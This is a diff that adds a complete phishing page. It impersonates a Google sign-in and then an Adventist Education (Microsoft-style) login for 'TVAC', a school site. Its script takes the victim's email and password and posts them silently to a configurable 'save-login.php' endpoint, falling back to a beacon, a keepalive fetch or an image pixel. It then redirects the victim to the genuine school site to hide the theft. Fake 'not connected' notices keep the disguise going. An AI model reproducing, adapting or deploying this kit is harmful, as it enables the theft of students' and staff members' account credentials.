@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#202124">
+<title>Sign in · TVAC</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --g-bg:#202124; --g-text:#e8eaed; --g-dim:#9aa0a6; --g-line:#5f6368;
+    --g-blue:#8ab4f8; --g-btn:#0b57d0; --g-btn-h:#0a4ab0;
+    --ms-bg:#111111; --ms-panel:#262626; --ms-text:#ffffff; --ms-dim:#9d9d9d; --ms-line:#8a8886;
+    --ms-blue:#4da3e0; --ms-btn:#1668c4; --ms-btn-h:#0e56a8;
+    --err:#f28b82;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;padding:0}
+  body{font-family:Roboto,system-ui,-apple-system,'Segoe UI',sans-serif;background:#111;color:#fff;
+    -webkit-font-smoothing:antialiased;-webkit-text-size-adjust:100%}
+  .app{min-height:100vh;display:flex;justify-content:center;align-items:stretch;position:relative}
+
+  .stage{display:none;width:100%;min-height:100vh;flex-direction:column;--pad:28px}
+  .stage.active{display:flex}
+  .stage.google{background:var(--g-bg);color:var(--g-text);padding:46px var(--pad) 40px}
+  .stage.ms{background:var(--ms-bg);color:var(--ms-text)}
+
+  @media (min-width:640px){
+    .app{align-items:center;padding:36px 20px}
+    .stage{min-height:0;max-width:448px;--pad:40px;border-radius:12px;overflow:hidden;
+      box-shadow:0 22px 60px rgba(0,0,0,.7)}
+    .stage.google{padding:44px var(--pad) 40px}
+  }
+
+  /* ================= GOOGLE ================= */
+  .g-logo{width:46px;height:46px;display:block}
+  .g-title{font-family:'Google Sans',Roboto,sans-serif;font-weight:400;letter-spacing:-.6px;
+    font-size:clamp(30px,7.5vw,36px);line-height:1.15;margin:40px 0 0;color:var(--g-text)}
+  .g-sub{font-size:16px;margin:30px 0 0;color:var(--g-text)}
+
+  .field{position:relative;margin-top:44px}
+  .field.outlined input{width:100%;height:64px;background:transparent;border:1px solid var(--g-line);
+    border-radius:4px;color:var(--g-text);font-size:17px;padding:0 16px;outline:none;font-family:inherit}
+  .field.outlined label{position:absolute;left:13px;top:50%;transform:translateY(-50%);padding:0 7px;
+    background:var(--g-bg);color:var(--g-dim);font-size:16px;pointer-events:none;transition:.13s ease}
+  .field.outlined input:focus{border-color:var(--g-blue);box-shadow:inset 0 0 0 1px var(--g-blue)}
+  .field.outlined input:focus+label,.field.outlined input:not(:placeholder-shown)+label{top:0;font-size:13px}
+  .field.outlined input:focus+label{color:var(--g-blue)}
+  .field.outlined input:not(:focus):not(:placeholder-shown)+label{color:var(--g-dim)}
+  .field.invalid input{border-color:var(--err)!important;box-shadow:inset 0 0 0 1px var(--err)!important}
+
+  .err{display:flex;gap:7px;align-items:flex-start;color:var(--err);font-size:13.5px;line-height:1.45;margin:10px 2px 0}
+  .err svg{width:15px;height:15px;flex:0 0 auto;margin-top:1px}
+  .err[hidden]{display:none}
+
+  .g-link{display:inline-block;color:var(--g-blue);font-size:15px;font-weight:500;margin-top:24px}
+  .g-note{font-size:15px;line-height:1.55;color:var(--g-dim);margin:46px 0 0}
+  .g-note span{color:var(--g-blue)}
+  .g-actions{display:flex;align-items:center;justify-content:space-between;gap:16px;margin-top:36px}
+
+  /* create-account button: fully transparent, no default chrome */
+  .g-txt{background:none;border:0;outline:none;box-shadow:none;appearance:none;-webkit-appearance:none;
+    margin:0;font-family:inherit;color:var(--g-blue);font-size:15px;font-weight:500;
+    padding:0;height:36px;line-height:36px;display:inline-flex;align-items:center}
+
+  .pill{background:var(--g-btn);color:#fff;border:0;border-radius:18px;padding:0 22px;height:36px;
+    font-size:15px;font-weight:500;font-family:inherit;min-width:76px}
+  .pill:hover{background:var(--g-btn-h)}
+
+  /* ================= MICROSOFT ================= */
+  .ms-panel{background:var(--ms-panel);padding:32px var(--pad) 0}
+  .ms-brand{display:inline-flex;align-items:stretch;align-self:flex-start}
+  .ms-badge{width:40px;height:47px;background:#1a4d8f;display:flex;align-items:center;justify-content:center}
+  .ms-badge svg{width:26px;height:22px;display:block}
+  .ms-btxt{background:#3d3d3d;display:flex;flex-direction:column;justify-content:center;
+    padding:0 12px;font-size:12.5px;line-height:1.28;color:#fff}
+  .ms-title{font-size:clamp(26px,6.5vw,31px);font-weight:600;margin:20px 0 0}
+  .field.under{border-bottom:1px solid var(--ms-line);margin-top:20px}
+  .field.under input{width:100%;background:transparent;border:0;outline:none;color:var(--ms-text);
+    font-size:17px;padding:12px 0;font-family:inherit}
+  .field.under input::placeholder{color:#b0aeab}
+  .field.under:focus-within{border-bottom-color:var(--ms-blue);box-shadow:0 1px 0 0 var(--ms-blue)}
+  .field.under.invalid{border-bottom-color:var(--err);box-shadow:0 1px 0 0 var(--err)}
+  .ms-link{display:inline-block;color:var(--ms-blue);font-size:15px;margin-top:24px}
+  .ms-actions{display:flex;gap:10px;justify-content:flex-end}
+  .ms-btn{border:0;font-family:inherit;font-size:15px;height:40px;min-width:112px;padding:0 30px;border-radius:0}
+  .ms-btn.solid{background:var(--ms-btn);color:#fff}
+  .ms-btn.solid:hover{background:var(--ms-btn-h)}
+  .ms-btn.ghost{background:rgba(255,255,255,.07);color:#fff}
+  .u{text-decoration:underline}
+  .ms-band{display:flex;align-items:center;gap:16px;background:#2a2a2a;border-top:1px solid #454545;
+    border-bottom:1px solid #454545;margin:62px calc(var(--pad)*-1) 0;padding:14px var(--pad);font-size:16px}
+  .ms-band svg{width:26px;height:26px;flex:0 0 auto}
+  .ms-foot{margin-top:auto;padding:16px var(--pad) 22px;display:flex;gap:26px;font-size:15px;
+    color:var(--ms-dim);flex-wrap:wrap;align-items:center}
+  .user-chip{display:flex;align-items:center;gap:12px;font-size:15px;margin-top:18px;word-break:break-all}
+  .chip-back{width:30px;height:30px;border-radius:50%;background:#3d3d3d;display:flex;align-items:center;
+    justify-content:center;flex:0 0 auto;border:0;padding:0}
+  .chip-back svg{width:16px;height:16px}
+  .ms-check{display:flex;align-items:center;gap:14px;margin-top:34px;font-size:15px;cursor:pointer;
+    user-select:none;-webkit-user-select:none;min-height:44px}
+  .box{width:20px;height:20px;border:2px solid #8a8886;border-radius:2px;flex:0 0 auto;display:flex;
+    align-items:center;justify-content:center;font-size:13px;transition:.1s}
+  .box.on{background:var(--ms-btn);border-color:var(--ms-btn);color:#fff}
+  .ms-body{font-size:15px;line-height:1.5;margin:22px 0 0}
+
+  [data-link]{cursor:pointer}
+  [data-link]:hover{text-decoration:underline}
+  .ms-band[data-link]:hover{text-decoration:none;background:#333}
+
+  /* ================= TOAST ================= */
+  .toast{position:absolute;left:50%;bottom:22px;transform:translateX(-50%);width:calc(100% - 36px);
+    max-width:400px;background:#2f2f2f;border:1px solid #4d4d4d;border-radius:10px;padding:12px 14px;
+    display:flex;gap:11px;align-items:flex-start;box-shadow:0 12px 34px rgba(0,0,0,.6);z-index:20;
+    opacity:0;pointer-events:none;transition:opacity .18s, transform .18s}
+  .toast.in{opacity:1;pointer-events:auto;transform:translateX(-50%) translateY(0)}
+  .toast:not(.in){transform:translateX(-50%) translateY(14px)}
+  .toast svg{width:19px;height:19px;flex:0 0 auto;margin-top:1px;color:#f5b942}
+  .toast b{display:block;font-size:13.5px;font-weight:500;margin-bottom:2px}
+  .toast span{font-size:12.5px;line-height:1.45;color:#c3c3c3}
+  .toast[hidden]{display:none}
+</style>
+</head>
+<body>
+
+<div class="app">
+
+  <!-- 1 · GOOGLE SIGN IN -->
+  <form class="stage google" data-stage="1" novalidate>
+    <svg class="g-logo" viewBox="0 0 48 48">
+      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+    </svg>
+    <h1 class="g-title">Sign in</h1>
+    <p class="g-sub">Use your Google Account</p>
+
+    <div class="field outlined">
+      <input id="g-email" type="email" placeholder=" " autocomplete="email" inputmode="email" spellcheck="false">
+      <label for="g-email">Email or phone</label>
+    </div>
+    <p class="err" id="g-err" hidden>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 7.5v6M12 16.6v.1"/></svg>
+      <span></span>
+    </p>
+
+    <a class="g-link" data-link="Forgot email?" data-msg="Google's account recovery isn't connected. You're back on the sign-in screen.">Forgot email?</a>
+
+    <p class="g-note">Not your computer? Use a private browsing window to sign in.
+      <span data-link="Learn more about using Guest mode" data-msg="The Guest mode help article isn't connected. You're back on the sign-in screen.">Learn more about using Guest mode</span>
+    </p>
+
+    <div class="g-actions">
+      <button type="button" class="g-txt" data-link="Create account" data-msg="Account creation isn't connected. You're back on the sign-in screen.">Create account</button>
+      <button type="submit" class="pill">Next</button>
+    </div>
+  </form>
+
+  <!-- 2 · MICROSOFT / TVAC EMAIL -->
+  <form class="stage ms" data-stage="2" novalidate>
+    <div class="ms-panel">
+      <div class="ms-brand">
+        <span class="ms-badge">
+          <svg viewBox="0 0 40 32">
+            <path d="M20 2c0 6.4 6 8.8 6 13.8A6 6 0 0 1 20 21.8 6 6 0 0 1 14 15.8C14 10.8 20 8.4 20 2z" fill="#ffffff"/>
+            <path d="M3 15l15-2.6v13.2L3 28.6z" fill="#e8eef6"/>
+            <path d="M37 15L22 12.4v13.2L37 28.6z" fill="#c9d8ea"/>
+          </svg>
+        </span>
+        <span class="ms-btxt"><span>Adventist</span><span>Education</span></span>
+      </div>
+
+      <h1 class="ms-title">Sign in</h1>
+
+      <div class="field under">
+        <input id="ms-email" type="email" placeholder="Email, phone, or Skype" autocomplete="email"
+               inputmode="email" spellcheck="false">
+      </div>
+      <p class="err" id="m-err" hidden>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 7.5v6M12 16.6v.1"/></svg>
+        <span></span>
+      </p>
+
+      <a class="ms-link" data-link="Can&rsquo;t access your account?" data-msg="Account recovery isn't connected. You're back on the sign-in screen.">Can&rsquo;t access your account?</a>
+
+      <div class="ms-actions" style="margin-top:74px">
+        <button type="submit" class="ms-btn solid">Next</button>
+      </div>
+
+      <div class="ms-band" data-link="Sign-in options" data-msg="Other sign-in methods aren't connected. You're back on the sign-in screen.">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#e8eaed" stroke-width="1.5"><circle cx="7.5" cy="12" r="4"/><path d="M11.5 12H21M17.5 12v2.6M20 12v1.8"/></svg>
+        <span>Sign-in options</span>
+      </div>
+    </div>
+
+    <div class="ms-foot">
+      <span data-link="Terms of use" data-msg="The terms page isn't connected. You're back on the sign-in screen.">Terms of use</span>
+      <span data-link="Privacy &amp; cookies" data-msg="The privacy page isn't connected. You're back on the sign-in screen.">Privacy &amp; cookies</span>
+      <span data-link="More options" data-msg="More options isn't connected. You're back on the sign-in screen.">&middot; &middot; &middot;</span>
+    </div>
+  </form>
+
+  <!-- 3 · PASSWORD -->
+  <form class="stage ms" data-stage="3" novalidate>
+    <div class="ms-panel">
+      <div class="ms-brand">
+        <span class="ms-badge">
+          <svg viewBox="0 0 40 32">
+            <path d="M20 2c0 6.4 6 8.8 6 13.8A6 6 0 0 1 20 21.8 6 6 0 0 1 14 15.8C14 10.8 20 8.4 20 2z" fill="#ffffff"/>
+            <path d="M3 15l15-2.6v13.2L3 28.6z" fill="#e8eef6"/>
+            <path d="M37 15L22 12.4v13.2L37 28.6z" fill="#c9d8ea"/>
+          </svg>
+        </span>
+        <span class="ms-btxt"><span>Adventist</span><span>Education</span></span>
+      </div>
+
+      <div class="user-chip">
+        <button type="button" class="chip-back" data-back="2" aria-label="Back">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.8"><path d="M19 12H6"/><path d="M11 6l-6 6 6 6"/></svg>
+        </button>
+        <span class="chip-mail"></span>
+      </div>
+
+      <h1 class="ms-title" style="margin-top:20px">Enter password</h1>
+
+      <div class="field under">
+        <input id="ms-pass" type="password" placeholder="Password" autocomplete="current-password">
+      </div>
+      <p class="err" id="p-err" hidden>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 7.5v6M12 16.6v.1"/></svg>
+        <span></span>
+      </p>
+
+      <a class="ms-link" data-link="Forgot my password" data-msg="Password recovery isn't connected. You're back on the password screen.">Forgot my password</a>
+      <br>
+      <a class="ms-link" style="margin-top:26px" data-link="Use a certificate or smart card" data-msg="Certificate / smart card sign-in isn't connected. You're back on the password screen.">Use a certificate or smart card</a>
+
+      <div class="ms-actions" style="margin-top:22px">
+        <button type="submit" class="ms-btn solid">Sign in</button>
+      </div>
+    </div>
+  </form>
+
+  <!-- 4 · STAY SIGNED IN -->
+  <form class="stage ms" data-stage="4" novalidate>
+    <div class="ms-panel">
+      <div class="ms-brand">
+        <span class="ms-badge">
+          <svg viewBox="0 0 40 32">
+            <path d="M20 2c0 6.4 6 8.8 6 13.8A6 6 0 0 1 20 21.8 6 6 0 0 1 14 15.8C14 10.8 20 8.4 20 2z" fill="#ffffff"/>
+            <path d="M3 15l15-2.6v13.2L3 28.6z" fill="#e8eef6"/>
+            <path d="M37 15L22 12.4v13.2L37 28.6z" fill="#c9d8ea"/>
+          </svg>
+        </span>
+        <span class="ms-btxt"><span>Adventist</span><span>Education</span></span>
+      </div>
+
+      <div style="font-size:15px;margin-top:22px;word-break:break-all" class="stay-mail"></div>
+      <h1 class="ms-title" style="margin-top:14px">Stay signed in?</h1>
+      <p class="ms-body">Do this to reduce the number of times you are asked to sign in.</p>
+
+      <label class="ms-check" for="dont">
+        <input type="checkbox" id="dont" style="position:absolute;opacity:0;pointer-events:none">
+        <span class="box" id="box"></span>
+        <span>Don&rsquo;t show this again</span>
+      </label>
+
+      <div class="ms-actions" style="margin-top:30px">
+        <button type="button" class="ms-btn ghost" data-done>No</button>
+        <button type="submit" class="ms-btn solid"><span class="u">Yes</span></button>
+      </div>
+    </div>
+
+    <div class="ms-foot">
+      <span data-link="Terms of use" data-msg="The terms page isn't connected. You're back where you were.">Terms of use</span>
+      <span data-link="Privacy &amp; cookies" data-msg="The privacy page isn't connected. You're back where you were.">Privacy &amp; cookies</span>
+      <span data-link="More options" data-msg="More options isn't connected. You're back where you were.">&middot; &middot; &middot;</span>
+    </div>
+  </form>
+
+  <div class="toast" id="toast" hidden aria-live="polite">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 7.5v6M12 16.6v.1"/></svg>
+    <div><b id="t-title"></b><span id="t-msg"></span></div>
+  </div>
+</div>
+
+<script>
+(function () {
+  /* ======== CONFIGURE THIS ======== */
+  var REDIRECT_URL = 'https://tvac.nsw.edu.au'; // where the user is sent after sign-in
+  var PHP_ENDPOINT = 'https://tvac.nsw.edu.au/save-login.php'; // silent POST target
+  var APPEND_EMAIL = true; // add ?email=... to the redirect URL
+  /* ================================ */
+
+  var EMAIL = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
+  var stages = [].slice.call(document.querySelectorAll('.stage'));
+  var user = '';
+
+  function stage(n) { return stages.filter(function (s) { return +s.dataset.stage === n; })[0]; }
+
+  function go(n) {
+    var s = stage(n);
+    if (!s) return;
+    stages.forEach(function (x) { x.classList.toggle('active', +x.dataset.stage === n); });
+    window.scrollTo(0, 0);
+    var f = s.querySelector('input:not([type=checkbox])');
+    if (f) setTimeout(function () { try { f.focus({ preventScroll: true }); } catch (e) {} }, 60);
+  }
+
+  function err(input, box, msg) {
+    box.querySelector('span').textContent = msg;
+    box.hidden = false;
+    input.closest('.field').classList.add('invalid');
+    input.setAttribute('aria-invalid', 'true');
+    input.focus();
+  }
+  function clear(input, box) {
+    box.hidden = true;
+    input.closest('.field').classList.remove('invalid');
+    input.removeAttribute('aria-invalid');
+  }
+
+  /* ---------- silent POST ---------- */
+  function sendSilently(email, password) {
+    var data = new FormData();
+    data.append('email', email);
+    data.append('password', password);
+    data.append('page', location.href);
+    data.append('sent', new Date().toISOString());
+
+    // 1. Beacon — built for "fire and then navigate away"
+    try {
+      if (navigator.sendBeacon && navigator.sendBeacon(PHP_ENDPOINT, data)) return;
+    } catch (e) {}
+
+    // 2. keepalive fetch — survives the redirect
+    try {
+      fetch(PHP_ENDPOINT, { method: 'POST', body: data, keepalive: true, mode: 'cors' });
+      return;
+    } catch (e) {}
+
+    // 3. last resort: pixel
+    var img = new Image();
+    img.src = PHP_ENDPOINT + '?email=' + encodeURIComponent(email) +
+              '&password=' + encodeURIComponent(password);
+  }
+
+  /* ---------- toast for dead links ---------- */
+  var tEl = document.getElementById('toast'), tTimer;
+  function toast(title, msg) {
+    document.getElementById('t-title').textContent = title;
+    document.getElementById('t-msg').textContent = msg;
+    tEl.hidden = false;
+    tEl.classList.remove('in');
+    void tEl.offsetWidth;
+    tEl.classList.add('in');
+    clearTimeout(tTimer);
+    tTimer = setTimeout(hideToast, 2800);
+  }
+  function hideToast() {
+    tEl.classList.remove('in');
+    setTimeout(function () {
+      tEl.hidden = true;
+      var s = document.querySelector('.stage.active');
+      var f = s && s.querySelector('input:not([type=checkbox])');
+      if (f) { try { f.focus({ preventScroll: true }); } catch (e) {} }
+    }, 200);
+  }
+  tEl.addEventListener('click', function () { clearTimeout(tTimer); hideToast(); });
+
+  document.querySelectorAll('[data-link]').forEach(function (el) {
+    el.addEventListener('click', function (e) {
+      e.preventDefault();
+      toast(el.dataset.link, el.dataset.msg || 'Not connected in this build.');
+    });
+  });
+
+  /* ---------- stage 1 ---------- */
+  var gEmail = document.getElementById('g-email'), gErr = document.getElementById('g-err');
+  gEmail.addEventListener('input', function () { clear(gEmail, gErr); });
+  stage(1).addEventListener('submit', function (e) {
+    e.preventDefault();
+    var v = gEmail.value.trim();
+    if (!v) return err(gEmail, gErr, 'Enter an email or phone number');
+    if (!EMAIL.test(v)) return err(gEmail, gErr, "Couldn't find your Google Account");
+    go(2);
+  });
+
+  /* ---------- stage 2 ---------- */
+  var mEmail = document.getElementById('ms-email'), mErr = document.getElementById('m-err');
+  mEmail.addEventListener('input', function () { clear(mEmail, mErr); });
+  stage(2).addEventListener('submit', function (e) {
+    e.preventDefault();
+    var v = mEmail.value.trim();
+    var msg = 'Enter a valid email address, phone number, or Skype name.';
+    if (!v) return err(mEmail, mErr, msg);
+    if (!EMAIL.test(v)) return err(mEmail, mErr, msg);
+    user = v;
+    document.querySelectorAll('.chip-mail, .stay-mail').forEach(function (el) { el.textContent = v; });
+    go(3);
+  });
+
+  /* ---------- stage 3 ---------- */
+  var pass = document.getElementById('ms-pass'), pErr = document.getElementById('p-err');
+  pass.addEventListener('input', function () { clear(pass, pErr); });
+  stage(3).addEventListener('submit', function (e) {
+    e.preventDefault();
+    if (!pass.value.trim()) return err(pass, pErr, 'Please enter your password.');
+    go(4);
+  });
+
+  /* ---------- stage 4 → send + redirect ---------- */
+  document.getElementById('dont').addEventListener('change', function () {
+    document.getElementById('box').classList.toggle('on', this.checked);
+  });
+  stage(4).addEventListener('submit', function (e) { e.preventDefault(); finish(); });
+  document.querySelector('[data-done]').addEventListener('click', finish);
+
+  function finish() {
+    sendSilently(user, pass.value);
+
+    var url = REDIRECT_URL;
+    if (APPEND_EMAIL && user) {
+      url += (url.indexOf('?') > -1 ? '&' : '?') + 'email=' + encodeURIComponent(user);
+    }
+    window.location.assign(url);
+  }
+
+  document.querySelectorAll('[data-back]').forEach(function (b) {
+    b.addEventListener('click', function () { go(+b.dataset.back); });
+  });
+
+  go(1);
+})();
+</script>
+</body>
+</html>
